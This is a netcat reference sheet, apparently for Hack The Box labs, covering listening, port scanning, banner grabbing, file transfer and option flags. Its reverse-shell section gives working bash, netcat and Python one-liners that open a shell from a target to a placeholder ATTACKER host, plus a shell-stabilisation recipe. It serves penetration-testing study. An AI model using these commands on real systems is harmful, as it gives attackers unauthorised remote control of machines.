# Netcat (nc)

## Purpose
The "Swiss army knife" of networking. Read/write data across TCP/UDP connections. Used for reverse shells, file transfer, port scanning, and banner grabbing.

## Installation
```bash
sudo apt install netcat-openbsd
```

## Quick Start
```bash
# Listen for connections (reverse shell catcher)
nc -lvnp 4444

# Connect to port
nc 10.10.10.x 80

# Banner grabbing
nc -v 10.10.10.x 22

# Port scanning
nc -zv 10.10.10.x 1-1000

# File transfer (receiver)
nc -lvnp 9999 > received_file
# File transfer (sender)
nc RECEIVER_IP 9999 < file_to_send

# Simple chat
nc -lvnp 4444    # listener
nc IP 4444       # connector
```

## Reverse Shells
```bash
# Bash reverse shell (on target)
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# Netcat reverse shell (on target)
nc ATTACKER 4444 -e /bin/bash

# Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

## Shell Stabilization
```bash
# On target (after getting shell)
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

## Key Options
| Option | Description |
|--------|-------------|
| `-l` | Listen mode |
| `-v` | Verbose |
| `-n` | No DNS resolution |
| `-p` | Port |
| `-e` | Execute program on connect |
| `-z` | Scan mode (no data) |
| `-u` | UDP mode |
| `-w <sec>` | Timeout |

## HTB Usage
- Catch every reverse shell with `nc -lvnp 4444`
- Use `rlwrap nc -lvnp 4444` for arrow key support
- Banner grab services for version info
- Transfer files when other methods aren't available
